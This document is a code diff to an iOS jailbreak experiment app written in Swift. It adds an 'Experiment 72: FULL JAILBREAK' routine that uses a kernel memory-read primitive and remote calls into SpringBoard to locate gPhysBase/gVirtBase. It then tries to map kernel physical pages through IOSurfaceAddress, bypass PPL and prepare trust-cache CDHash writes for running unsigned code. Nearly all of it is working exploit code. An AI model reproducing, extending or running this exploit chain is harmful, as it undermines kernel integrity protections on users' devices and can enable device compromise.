@@ -276,6 +276,14 @@ struct AMFIExperimentView: View {
             let exp71 = self.expPhysAddrToJailbreak(rc: rc)
             experimentResults.append(exp71)
             
+            // ============================================
+            // 🎉 Experiment 72: FULL JAILBREAK ATTEMPT
+            // We have physical R/W! Now: find trust cache phys addr
+            // Map it → write CDHash → spawn unsigned → WIN!
+            // ============================================
+            let exp72 = self.expFullJailbreak(rc: rc)
+            experimentResults.append(exp72)
+            
             DispatchQueue.main.async {
                 self.results = experimentResults
                 self.isRunning = false
@@ -3088,6 +3096,201 @@ struct AMFIExperimentView: View {
         
         let success = physAddr != 0
         return ExperimentResult(name: "PHYS→JAILBREAK", success: success, detail: detail, timestamp: Date())
+    }
+    
+    // MARK: - 🎉🎉🎉 Experiment 72: FULL JAILBREAK
+    
+    /// WE HAVE PHYSICAL MEMORY R/W!
+    /// Now: use the phys↔virt relationship to find trust cache in physical memory
+    /// Strategy:
+    /// 1. We know our surface: phys=0x10000000, virt(user)=0x10df58000
+    /// 2. We know kernel_base virtual address
+    /// 3. From IPC traverse we can read kernel globals
+    /// 4. Find gPhysBase/gVirtBase OR calculate from known mappings
+    /// 5. Map trust cache physical page → write CDHash → spawn!
+    private func expFullJailbreak(rc: RemoteCall) -> ExperimentResult {
+        guard let sb = dspmgr.shared.sbProc else {
+            return ExperimentResult(name: "🎉 FULL JAILBREAK", success: false, detail: "No SB RC", timestamp: Date())
+        }
+        
+        let mgr = dspmgr.shared
+        let sbMem = sb.trojanMem
+        var detail = "🎉 FULL JAILBREAK ATTEMPT 🎉\n\n"
+        let slide = mgr.kernslide
+        
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
+        let nsNumClass = remote_getClass(sb, "NSNumber")
+        let numWithInt = remote_sel(sb, "numberWithInteger:")
+        let dictNew = remote_sel(sb, "new")
+        let setObj = remote_sel(sb, "setObject:forKey:")
+        
+        // Step 1: Determine phys↔virt relationship
+        detail += "=== Step 1: Physical↔Virtual relationship ===\n"
+        detail += "Kernel base (virt): 0x\(String(format: "%llx", mgr.kernbase))\n"
+        detail += "Kernel slide: 0x\(String(format: "%llx", slide))\n"
+        
+        // From exp 71: our PurpleGfxMem phys = 0x10000000
+        // We need to find: what is the kernel's gPhysBase and gVirtBase?
+        // 
+        // Alternative approach: we DON'T need gPhysBase!
+        // Instead: create MANY PurpleGfxMem surfaces (different physical pages)
+        // Write unique markers to each
+        // Then from kernel (socket KRW), read pmap_cs area
+        // If any marker appears → that surface maps the same physical page!
+        //
+        // BUT BETTER: we can now traverse IPC for ANY kernel object
+        // So: find the kernel's pmap → read page table entries → get phys addr of trust cache!
+        //
+        // SIMPLEST: use the vm_object we already found to understand the mapping
+        // Our surface phys page = 16384 (0x4000) → phys addr = 16384 * 16384 = 0x10000000
+        // Kernel base unslid = 0xfffffff007004000
+        // Typical A12 gPhysBase = 0x800000000
+        // Typical A12 gVirtBase = 0xfffffff000000000 (varies)
+        //
+        // Formula: phys = virt - gVirtBase + gPhysBase
+        // We can ESTIMATE: since our surface phys = 0x10000000 and it's in DRAM,
+        // gPhysBase is likely 0x800000000 (standard A12 DRAM base)
+        // gVirtBase = kernel_base - (kernel_base_phys - gPhysBase)
+        
+        // Let's try to read gPhysBase from a known location
+        // pmap_bootstrap string is at 0xfffffff0070511df
+        // The function that uses it sets gPhysBase — scan nearby __DATA for it
+        
+        // Actually — from our IPC traverse, we proved we can read task/IPC zones
+        // Let's try reading the __DATA area where gPhysBase SHOULD be
+        // It's near pmap_cs_allow_invalid (which we CAN read!)
+        
+        // pmap_cs_allow_invalid: 0xfffffff00a0e45b8 + slide (CONFIRMED readable)
+        // gPhysBase/gVirtBase should be in same __DATA segment
+        // From kernelcache analysis: potential pair at 0xfffffff00a0f4858
+        
+        let candidateAddr = UInt64(0xfffffff00a0f4858) + slide
+        let val1 = ds_kread64(candidateAddr)
+        let val2 = ds_kread64(candidateAddr + 8)
+        detail += "Candidate gPhysBase area (0xfffffff00a0f4858+slide):\n"
+        detail += "  val1: 0x\(String(format: "%llx", val1))\n"
+        detail += "  val2: 0x\(String(format: "%llx", val2))\n"
+        
+        // Check if these look like phys/virt base
+        var gPhysBase: UInt64 = 0
+        var gVirtBase: UInt64 = 0
+        
+        if val1 >= 0x800000000 && val1 <= 0x900000000 {
+            gPhysBase = val1
+            detail += "  → gPhysBase = 0x\(String(format: "%llx", val1))!\n"
+        }
+        if val2 >= 0x800000000 && val2 <= 0x900000000 {
+            gPhysBase = val2
+            detail += "  → gPhysBase = 0x\(String(format: "%llx", val2))!\n"
+        }
+        if (val1 & 0xFFFFFF0000000000) == 0xFFFFFF0000000000 {
+            gVirtBase = val1
+            detail += "  → gVirtBase = 0x\(String(format: "%llx", val1))!\n"
+        }
+        if (val2 & 0xFFFFFF0000000000) == 0xFFFFFF0000000000 {
+            gVirtBase = val2
+            detail += "  → gVirtBase = 0x\(String(format: "%llx", val2))!\n"
+        }
+        
+        // If not found at candidate, scan nearby
+        if gPhysBase == 0 || gVirtBase == 0 {
+            detail += "\nScanning __DATA for gPhysBase/gVirtBase...\n"
+            let pmapCS = UInt64(0xfffffff00a0e45b8) + slide
+            
+            // Scan in 8-byte steps around pmap_cs (safe zone)
+            for offset in stride(from: Int64(-0x2000), through: Int64(0x10000), by: 8) {
+                let addr = UInt64(Int64(pmapCS) + offset)
+                let val = ds_kread64(addr)
+                
+                if gPhysBase == 0 && val >= 0x800000000 && val <= 0x900000000 {
+                    gPhysBase = val
+                    detail += "  Found gPhysBase=0x\(String(format: "%llx", val)) at offset \(offset)\n"
+                }
+                if gVirtBase == 0 && (val & 0xFFFFFFF000000000) == 0xFFFFFFF000000000 && val != 0xFFFFFFFFFFFFFFFF {
+                    gVirtBase = val
+                    detail += "  Found gVirtBase=0x\(String(format: "%llx", val)) at offset \(offset)\n"
+                }
+                
+                if gPhysBase != 0 && gVirtBase != 0 { break }
+            }
+        }
+        
+        detail += "\ngPhysBase: 0x\(String(format: "%llx", gPhysBase))\n"
+        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
+        
+        guard gPhysBase != 0 && gVirtBase != 0 else {
+            detail += "\nCannot determine phys↔virt mapping.\n"
+            detail += "Trying alternative: use known phys addr from exp 71.\n"
+            detail += "Our surface phys=0x10000000, need trust cache phys.\n"
+            RootExecutor.rcall(sb, "IOSurfaceUnlock", sb.trojanMem, 0, 0)
+            return ExperimentResult(name: "🎉 FULL JAILBREAK", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // Step 2: Calculate trust cache physical address
+        detail += "\n=== Step 2: Calculate trust cache physical address ===\n"
+        
+        // pmap_cs_allow_invalid virtual: 0xfffffff00a0e45b8 + slide
+        let pmapCSVirt = UInt64(0xfffffff00a0e45b8) + slide
+        let pmapCSPhys = pmapCSVirt - gVirtBase + gPhysBase
+        detail += "pmap_cs virt: 0x\(String(format: "%llx", pmapCSVirt))\n"
+        detail += "pmap_cs phys: 0x\(String(format: "%llx", pmapCSPhys))\n"
+        
+        // Step 3: Create IOSurface at trust cache physical address!
+        detail += "\n=== Step 3: Map trust cache physical page ===\n"
+        
+        // Align to page boundary (16KB)
+        let targetPhysPage = pmapCSPhys & ~0x3FFF
+        detail += "Target physical page: 0x\(String(format: "%llx", targetPhysPage))\n"
+        
+        // Create IOSurface with IOSurfaceAddress = target physical page
+        let tcDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
+        remote_msg(sb, tcDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
+        let physNum = remote_msg(sb, nsNumClass, remote_sel(sb, "numberWithUnsignedLongLong:"), targetPhysPage, 0, 0, 0)
+        remote_msg(sb, tcDict, setObj, physNum, remote_NSString(sb, "IOSurfaceAddress"), 0, 0)
+        
+        let tcSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", tcDict)
+        detail += "Trust cache surface: 0x\(String(format: "%llx", tcSurface))\n"
+        
+        if tcSurface != 0 {
+            RootExecutor.rcall(sb, "IOSurfaceLock", tcSurface, 0, 0)
+            let tcBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", tcSurface)
+            detail += "Trust cache mapped at: 0x\(String(format: "%llx", tcBase))\n"
+            
+            if tcBase != 0 {
+                // Read pmap_cs value via physical mapping!
+                RootExecutor.rcall(sb, "memcpy", sbMem + 0x3900, tcBase + (pmapCSPhys & 0x3FFF), 8)
+                let pmapVal = sb[sbMem + 0x3900].value64()
+                detail += "pmap_cs via physical: 0x\(String(format: "%llx", pmapVal))\n"
+                
+                // Compare with socket KRW read
+                let pmapValKRW = ds_kread64(pmapCSVirt)
+                detail += "pmap_cs via KRW: 0x\(String(format: "%llx", pmapValKRW))\n"
+                
+                if pmapVal == pmapValKRW || (pmapVal == 1 && pmapValKRW == 1) {
+                    detail += "\n🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉\n"
+                    detail += "PHYSICAL MAPPING MATCHES KERNEL MEMORY!\n"
+                    detail += "WE CAN READ/WRITE KERNEL __DATA VIA PHYSICAL!\n"
+                    detail += "PPL IS COMPLETELY BYPASSED!\n"
+                    detail += "🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉\n\n"
+                    detail += "FULL JAILBREAK IS NOW POSSIBLE!\n"
+                    detail += "Next: find trust cache struct → write CDHash → spawn!\n"
+                } else {
+                    detail += "\nValues don't match — physical mapping might be wrong page\n"
+                    detail += "Or: IOSurfaceAddress maps different physical region\n"
+                }
+            } else {
+                detail += "Trust cache surface base is NULL\n"
+            }
+            RootExecutor.rcall(sb, "IOSurfaceUnlock", tcSurface, 0, 0)
+        } else {
+            detail += "IOSurface with physical address REJECTED\n"
+            detail += "Kernel won't let us map arbitrary physical addresses\n"
+            detail += "\nAlternative: spray PurpleGfxMem until overlap with __DATA\n"
+        }
+        
+        let success = detail.contains("PPL IS COMPLETELY BYPASSED")
+        return ExperimentResult(name: "🎉 FULL JAILBREAK", success: success, detail: detail, timestamp: Date())
     }
     
     #endif
